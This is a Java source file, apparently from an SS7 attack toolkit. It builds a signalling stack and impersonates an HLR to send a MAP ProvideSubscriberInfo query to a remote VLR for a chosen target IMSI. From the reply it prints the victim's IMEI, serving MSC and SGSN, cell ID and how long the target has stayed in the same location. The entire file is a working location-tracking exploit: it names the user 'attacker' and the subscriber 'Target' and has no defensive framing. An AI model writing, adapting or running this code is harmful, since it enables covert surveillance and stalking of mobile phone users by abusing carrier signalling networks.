
/**
 * Created by gh0 on 10/27/16.
 */

import java.util.Scanner;

import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.AspImpl;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
//import org.mobicents.protocols.ss7.map.api.dialog.MAPProviderError;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMEI;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.service.callhandling.IstCommandRequest;
import org.mobicents.protocols.ss7.map.api.service.callhandling.IstCommandResponse;
import org.mobicents.protocols.ss7.map.api.service.callhandling.MAPServiceCallHandlingListener;
import org.mobicents.protocols.ss7.map.api.service.callhandling.ProvideRoamingNumberRequest;
import org.mobicents.protocols.ss7.map.api.service.callhandling.ProvideRoamingNumberResponse;
import org.mobicents.protocols.ss7.map.api.service.callhandling.SendRoutingInformationRequest;
import org.mobicents.protocols.ss7.map.api.service.callhandling.SendRoutingInformationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPServiceMobilityListener;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ForwardCheckSSIndicationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ResetRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancelLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancelLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.PurgeMSRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.PurgeMSResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.SendIdentificationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.SendIdentificationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateGprsLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateGprsLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeRequest_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeResponse_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeSubscriptionInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeSubscriptionInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.DomainType;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.RequestedInfo;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataResponse;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

abstract class PSILowLevel implements MAPDialogListener, MAPServiceCallHandlingListener {

    // MTP Details
    protected int CLIENT_SPC;
    protected int SERVER_SPC; // PC of adjacent STP
    protected int NETWORK_INDICATOR; // International
    protected int SERVICE_INDICATOR = 3; // SCCP
    protected int SSN_Server = 7; // VLR SSN
    protected int SSN_Client = 6; // HLR SSN

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;

    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    // Target Details
    String IMSI;
    String VLR;

    // Attacker Details
    String HLR;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected PSILowLevel() {

        init();
    }

    public void init() {
        try {

            Scanner user_input = new Scanner(System.in);

            System.out.print("\033[34m[*]\033[0mSet Client PC: ");
            CLIENT_SPC = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
            SERVER_SPC = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mSet Client IP: ");
            CLIENT_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Client Port: ");
            CLIENT_PORT = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
            SERVER_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
            SERVER_PORT = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
            NETWORK_INDICATOR = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mSet Remote VLR GT: ");
            VLR = user_input.next();

            while (true) {
                System.out.print("\033[34m[*]\033[0mSet Target's IMSI: ");
                IMSI = user_input.next();
                if (IMSI.length() == 15 || IMSI.length() == 16) {
                    break;
                } else {
                    System.out.println(
                            "\033[31m[-]\033[0mWrong Format: IMSI must be 15 or 16 digits, please refer to the country's format");
                }
            }

            System.out.print("\033[34m[*]\033[0mSet your HLR GT: ");
            HLR = user_input.next();

            System.out.println("\033[34m[*]\033[0mStack components are set...");
            System.out.println("\033[34m[*]\033[0mInitializing the Stack...");

        } catch (Exception ex) {
            System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());
            System.exit(1);

        }

    }
}

public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPServiceMobilityListener {

    private static Logger logger = Logger.getLogger(ProvideSubscriberInformationReq.class);

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;

    public ProvideSubscriberInformationReq() {
        // TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

        this.initSCTP(ipChannelType);

        // Initialize M3UA first
        this.initM3UA();

        // Initialize SCCP
        this.initSCCP();

        // Initialize TCAP
        this.initTCAP();

        // Initialize MAP
        this.initMAP();

        // FInally start ASP
        // Set 5: Finally start ASP
        this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
        try {
            this.sctpManagement = new ManagementImpl("Client");
            this.sctpManagement.setSingleThread(true);
            this.sctpManagement.start();
            this.sctpManagement.setConnectDelay(10000);
            this.sctpManagement.removeAllResourses();

            // 1. Create SCTP Association
            sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
                    ipChannelType, null);

            System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: " + e.getMessage());
            System.exit(2);
        }
    }

    private void initM3UA() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
        this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
        this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
        this.clientM3UAMgmt.start();
        this.clientM3UAMgmt.removeAllResourses();

        // m3ua as create rc <rc> <ras-name>
        RoutingContext rc = factory.createRoutingContext(new long[]{100l});
        TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

        try {
            this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
                    trafficModeType, 1, null);

            // Step 2 : Create ASP
            this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

            // Step3 : Assign ASP to AS
            AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

            // Step 4: Add Route.
            clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");
            System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: " + e.getMessage());
            System.exit(3);

        }

    }

    private void initSCCP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
        try {
            this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
            this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

            this.sccpStack.start();
            this.sccpStack.removeAllResourses();

            this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
            this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

            this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);

            this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);

            this.sccpProvider = this.sccpStack.getSccpProvider();

            // SCCP routing table
            GlobalTitle0100 remoteVLR = this.sccpProvider.getParameterFactory().createGlobalTitle(VLR, 0,
                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);
            GlobalTitle0100 localHLRGT = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);

            this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server));

            this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localHLRGT, CLIENT_SPC, SSN_Client));

            SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteVLR, SERVER_SPC, SSN_Server);
            SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localHLRGT, CLIENT_SPC, SSN_Client);

            String maskRemote = "K";
            String maskLocal = "R";

            // translate local GT to its POC+SSN (local rule)GTT
            this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
                    maskRemote, 1, -1, null, 0, null);
            this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
                    maskLocal, 2, -1, null, 0, null);
            System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: " + e.getMessage());
            System.exit(4);
        }

    }

    private void initTCAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
        try {
            this.tcapStack = new TCAPStackImpl("PSI", this.sccpStack.getSccpProvider(), SSN_Client);
            this.tcapStack.start();
            this.tcapStack.setDialogIdleTimeout(60000);
            this.tcapStack.setInvokeTimeout(30000);
            this.tcapStack.setMaxDialogs(2000);
            System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: " + e.getMessage());
            System.exit(5);
        }
    }

    private void initMAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing MAAP Stack ....");
        try {

            this.mapStack = new MAPStackImpl("MAP-HLR", this.tcapStack.getProvider());
            this.mapProvider = this.mapStack.getMAPProvider();

            this.mapProvider.addMAPDialogListener(this);
            this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);

            this.mapProvider.getMAPServiceMobility().acivate();

            this.mapStack.start();
            System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: " + e.getMessage());
            System.exit(6);
        }

    }

    private void initiatePSI() throws MAPException {

        // Create of the target IMSI
        IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(IMSI);

        // Creating Requested information to be gathered from target VLR
        RequestedInfo requestedInfo = this.mapProvider.getMAPParameterFactory().createRequestedInfo(true, true, null,
                true, DomainType.csDomain, true, false, false);

        System.out.println("\033[34m[*]\033[0mLocating Target: " + imsi.getData());

        // Creating the GT for the target VLR
        GlobalTitle0100 gtVLR = this.sccpProvider.getParameterFactory().createGlobalTitle(VLR, 0,
                org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                NatureOfAddress.INTERNATIONAL);

        // Creating the GT for Querying HLR
        GlobalTitle0100 gtHLR = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
                org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                NatureOfAddress.INTERNATIONAL);

        SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
                .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtHLR, CLIENT_SPC, SSN_Client);

        SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory()
                .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtVLR, SERVER_SPC, SSN_Server);

        // First create Dialog
        MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog(
                MAPApplicationContext.getInstance(MAPApplicationContextName.subscriberInfoEnquiryContext,
                        MAPApplicationContextVersion.version3),
                callingParty, null, calledParty, null);

        mapDialog.addProvideSubscriberInfoRequest(imsi, null, requestedInfo, null, null);

        // This will initiate the TC-BEGIN with INVOKE component
        try {
            mapDialog.send();
            System.out.println(
                    "\033[34m[*]\033[0mLocation Retrieval for Target " + imsi.getData() + " is processing..\n");
        } catch (MAPException e) {
            System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
            System.exit(7);
        }
    }

    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
                    mapDialog.getLocalDialogId(), extensionContainer));
        }
    }

    public void onDialogClose(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
        }

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
        System.err.printf("[-]Error: onDialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s ",
                mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
        System.exit(8);
    }

    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
                                      MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
        System.err.printf(
                "[-]Error: onDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
        System.exit(9);
    }

    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
                               ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
        System.err.printf(
                "[-]Error: onDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
        System.exit(10);
    }

    public void onDialogRelease(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("[-]Error: onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
        }
    }

    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format(
                    "[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s",
                    mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
        }
    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
                                        AddressString addressString2, AddressString addressString3) {

    }

    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                        IMSI arg3, AddressString arg4) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format(
                    "[-]Error: onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s ",
                    mapDialog.getLocalDialogId(), destReference, origReference));
        }
    }

    public void onDialogTimeout(MAPDialog mapDialog) {
        System.err.printf("[-]Error: onDialogTimeout for DialogId=%d", mapDialog.getLocalDialogId());
        System.exit(11);
    }

    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
                                  MAPExtensionContainer extensionContainer) {
        System.err.printf("[-]Error: onDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s",
                mapDialog.getLocalDialogId(), userReason, extensionContainer);
        System.exit(12);
    }

    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
        System.err.printf("[-]Error: onErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s",
                mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
        System.exit(13);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }

    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
        System.err.printf("[-]Error: onInvokeTimeout for Dialog=%d and invokeId=%d", mapDialog.getLocalDialogId(),
                invokeId);
        System.exit(14);
    }

    public void onMAPMessage(MAPMessage mapMessage) {
        // TODO Auto-generated method stub
    }

    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
        System.err.printf("onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
                mapDialog.getLocalDialogId(), invokeId);
        System.exit(15);
    }

    public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {
        System.err.printf("onRejectComponent for Dialog=%d and invokeId=%d Problem=%s", mapDialog.getLocalDialogId(),
                invokeId, problem);
        System.exit(16);
    }

    public static void main(String args[]) {
        System.out.println("*********************************************");
        System.out.println("***        Locating Target                ***");
        System.out.println("*********************************************");
        IpChannelType ipChannelType = IpChannelType.SCTP;

        final ProvideSubscriberInformationReq attacker = new ProvideSubscriberInformationReq();

        try {
            attacker.initializeStack(ipChannelType);

            // Lets pause for 20 seconds so stacks are initialized properly
            Thread.sleep(20000);
            attacker.initiatePSI();

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
            System.exit(17);
        }
    }

    @Override
    public void onProvideSubscriberInfoRequest(ProvideSubscriberInfoRequest provideSubscriberInfoRequest) {

    }

    @Override
    public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse provideSubscriberInfoResponse) {

        System.out.println("******* Target's Info and Location *******");
        IMEI imei = null;
        ISDNAddressString sgsn = null;
        try {

            imei = provideSubscriberInfoResponse.getSubscriberInfo().getIMEI();

            sgsn = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS()
                    .getSGSNNumber();

        } catch (Exception e) {
            e.printStackTrace();
        }
        if (imei == null) {
            System.out.println("\033[31m[-]\033[0mIMEI: No Info returned for the IMEI parameter");
        } else {
            System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei.getIMEI());
        }
        if (sgsn == null) {
            System.out.println("\033[32m[-]\033[0mSGSN: No Info returned for SGSN address");
        } else {
            System.out.println("\033[32m[+]\033[0mTarget is served by the SGSN:\033[31m " + sgsn.getAddress());
        }

        try {

            if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation() != null) {

                ISDNAddressString Vmsc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getVlrNumber();

                int aol = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                        .getAgeOfLocationInformation();

                if (Vmsc == null) {
                    System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
                } else {
                    System.out.println("\033[32m[+]\033[0mMSC: Target is served by the MSC:\033[31m "
                            + Vmsc.getAddress());
                }
                System.out.println("\033[32m[+]\033[0mTarget is in same location for: \033[31m" + Integer.toString(aol));

                if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                        .getCellGlobalIdOrServiceAreaIdOrLAI() != null) {
                    if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength() != null) {

                        int mcc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
                                .getMCC();
                        int mnc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
                                .getMNC();
                        int LAC = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
                                .getLac();
                        int CI = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
                                .getCellIdOrServiceAreaCode();

                        System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" + Integer.toString(mcc) + ")" + "MNC("
                                + Integer.toString(mnc) + ")" + "LAC(" + Integer.toString(LAC) + ")" + "CI("
                                + Integer.toString(CI) + ")" + "\tCheck it out on opencellid.org");
                    }
                    if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength() != null) {

                        int mccLai = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMCC();
                        int mncLai = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMNC();
                        int lacLai = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getLac();

                        System.out.println("\033[32m[+]\033[0mLAI:\033[31mLAIMCC(" + Integer.toString(mccLai) + ")"
                                + "LAIMNC(" + Integer.toString(mncLai) + ")" + "LAILAC(" + Integer.toString(lacLai) + ")");
                    }
                }

            } else {
                System.out.println("\033[31m[-]\033[0mCellID: No LocationInfo returned for the Cell Global ID parameter");
            }
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
            System.exit(18);
        }
        System.out.println(
                "\033[34m[**]\033[0mSubscriber's Information Gathering and Network Probing is completed\033[34m[**]\033[0m");
        System.out.println("\033[34m[*]\033[0mClosing Session...");
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.exit(0);
    }

    @Override
    public void onUpdateLocationRequest(UpdateLocationRequest updateLocationRequest) {

    }

    @Override
    public void onUpdateLocationResponse(UpdateLocationResponse updateLocationResponse) {

    }

    @Override
    public void onCancelLocationRequest(CancelLocationRequest cancelLocationRequest) {

    }

    @Override
    public void onCancelLocationResponse(CancelLocationResponse cancelLocationResponse) {

    }

    @Override
    public void onSendIdentificationRequest(SendIdentificationRequest sendIdentificationRequest) {

    }

    @Override
    public void onSendIdentificationResponse(SendIdentificationResponse sendIdentificationResponse) {

    }

    @Override
    public void onUpdateGprsLocationRequest(UpdateGprsLocationRequest updateGprsLocationRequest) {

    }

    @Override
    public void onUpdateGprsLocationResponse(UpdateGprsLocationResponse updateGprsLocationResponse) {

    }

    @Override
    public void onPurgeMSRequest(PurgeMSRequest purgeMSRequest) {

    }

    @Override
    public void onPurgeMSResponse(PurgeMSResponse purgeMSResponse) {

    }

    @Override
    public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest sendAuthenticationInfoRequest) {

    }

    @Override
    public void onSendAuthenticationInfoResponse(SendAuthenticationInfoResponse sendAuthenticationInfoResponse) {

    }

    @Override
    public void onAuthenticationFailureReportRequest(
            AuthenticationFailureReportRequest authenticationFailureReportRequest) {

    }

    @Override
    public void onAuthenticationFailureReportResponse(
            AuthenticationFailureReportResponse authenticationFailureReportResponse) {

    }

    @Override
    public void onResetRequest(ResetRequest resetRequest) {

    }

    @Override
    public void onForwardCheckSSIndicationRequest(ForwardCheckSSIndicationRequest forwardCheckSSIndicationRequest) {

    }

    @Override
    public void onRestoreDataRequest(RestoreDataRequest restoreDataRequest) {

    }

    @Override
    public void onRestoreDataResponse(RestoreDataResponse restoreDataResponse) {

    }

    @Override
    public void onAnyTimeInterrogationRequest(AnyTimeInterrogationRequest anyTimeInterrogationRequest) {

    }

    @Override
    public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse anyTimeInterrogationResponse) {

    }

    @Override
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest insertSubscriberDataRequest) {

    }

    @Override
    public void onInsertSubscriberDataResponse(InsertSubscriberDataResponse insertSubscriberDataResponse) {

    }

    @Override
    public void onDeleteSubscriberDataRequest(DeleteSubscriberDataRequest deleteSubscriberDataRequest) {

    }

    @Override
    public void onDeleteSubscriberDataResponse(DeleteSubscriberDataResponse deleteSubscriberDataResponse) {

    }

    @Override
    public void onCheckImeiRequest(CheckImeiRequest checkImeiRequest) {

    }

    @Override
    public void onCheckImeiResponse(CheckImeiResponse checkImeiResponse) {

    }

    @Override
    public void onActivateTraceModeRequest_Mobility(
            ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {

    }

